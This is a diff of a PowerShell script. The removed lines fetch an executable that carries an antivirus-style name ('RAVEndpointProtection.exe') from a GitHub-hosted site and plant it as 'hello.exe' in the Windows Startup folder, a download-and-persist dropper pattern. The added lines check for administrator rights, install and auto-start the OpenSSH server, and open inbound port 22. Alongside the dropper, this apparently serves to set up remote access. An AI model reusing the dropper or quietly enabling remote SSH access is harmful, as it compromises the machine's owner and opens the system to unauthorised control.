@@ -1,13 +1,26 @@
-# Define the URL of the file to download and the destination path
-$fileUrl = "https://github.com/webntdev/webntdev.github.io/raw/main/RAVEndpointProtection.exe"
-$destinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\hello.exe"
+(New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
-# Download the file
-Invoke-WebRequest -Uri $fileUrl -OutFile $destinationPath
+Start-Sleep -Seconds 1
 
-# Verify the download
-if (Test-Path $destinationPath) {
-    Write-Output "File downloaded successfully and saved to startup folder as hello.exe"
+Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
+
+Start-Sleep -Seconds 1
+# Install the OpenSSH Client
+Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
+Start-Sleep -Seconds 1
+# Install the OpenSSH Server
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+Start-Sleep -Seconds 1
+# Start the sshd service
+Start-Service sshd
+
+# OPTIONAL but recommended:
+Set-Service -Name sshd -StartupType 'Automatic'
+
+# Confirm the Firewall rule is configured. It should be created automatically by setup. Run the following to verify
+if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) {
+    Write-Output "Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it..."
+    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
 } else {
-    Write-Output "Failed to download the file."
+    Write-Output "Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists."
 }
